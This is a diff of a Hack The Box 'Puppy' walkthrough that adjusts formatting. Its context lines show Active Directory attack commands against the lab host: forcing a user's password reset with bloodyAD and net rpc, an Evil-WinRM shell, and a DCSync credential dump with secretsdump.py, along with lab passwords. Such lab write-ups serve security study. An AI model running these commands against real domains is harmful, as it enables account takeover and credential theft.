@@ -384,10 +384,12 @@ Import to `BloodHound` and start investigating the graph.
 ![BloodHound](/assets/img/puppy-htb-season8/bloodhound4.png)
 
 Found out that `ant.edwards` is a member of `SENIOR DEVS@PUPPY.HTB` group and has `GenericAll` to user `ADAM.SILVER@PUPPY.HTB`.
+
 &rarr; We can use `ant.edwards` to change the password of `ADAM.SILVER@PUPPY.HTB` and gain access to the machine.
 
 **There are some ways to do this:**
-We can use `bloodyAD` to change the password of `ADAM.SILVER@PUPPY.HTB`.
+
+1. We can use `bloodyAD` to change the password of `ADAM.SILVER@PUPPY.HTB`.
 
 ```bash
 └─$ bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --dc-ip 10.10.11.70 set password adam.silver 'P@ssw4rd123'
@@ -453,7 +455,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\adam.silver\Documents>
 ```
 
-Another approach can use [ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword) through `rpc`.
+2. Another approach can use [ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword) through `rpc`.
 
 ```bash
 └─$ net rpc password 'adam.silver' 'P@ssw4rd123' -U 'PUPPY.HTB'/'ant.edwards'%'Antman2025!' -S '10.10.11.70'
@@ -781,7 +783,8 @@ Import again.
 ![BloodHound](/assets/img/puppy-htb-season8/bloodhound8.png)
 
 Found out that `steph.cooper_adm` has `DCSync`. <br>
-&rarr; We can use `DCSync` to dump all the credentials of `Administrator` account.
+
+&rarr; We can use `DCSync` attack to dump all the credentials of `Administrator` account.
 
 ```bash
 └─$ secretsdump.py 'PUPPY.HTB/steph.cooper_adm:FivethChipOnItsWay2025!'@10.10.11.70
